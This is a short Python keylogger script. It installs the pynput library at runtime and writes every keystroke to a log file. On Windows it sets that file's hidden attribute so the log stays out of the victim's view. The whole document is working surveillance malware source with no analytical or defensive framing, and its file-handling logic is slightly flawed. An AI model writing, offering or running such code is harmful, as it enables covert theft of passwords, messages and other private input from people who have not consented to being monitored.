#imports
import sys
import subprocess
import platform
#install pynput
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
#keylogger
from pynput import keyboard
path = 'captured.log'
if platform.system()=='Windows':
    subprocess.check_call(["attrib","+H",path])
def on_press(key):
    file = open(path,'a')
    if(str(key)=='Key.space'):
        file.write(' ')
    elif (str(key)=='Key.enter'):
        file.write('\n')
    elif (str(key)=='Key.shift'):
        file.write('')
    elif (str(key)=='Key.backspace'):
        file.write('(Backspace)')
    else:
        file.write(str(key).replace("'",''))
        file.close()
with keyboard.Listener( on_press=on_press) as listener:
    try:
        listener.join()
    except:
        file.close()
        print('closed')
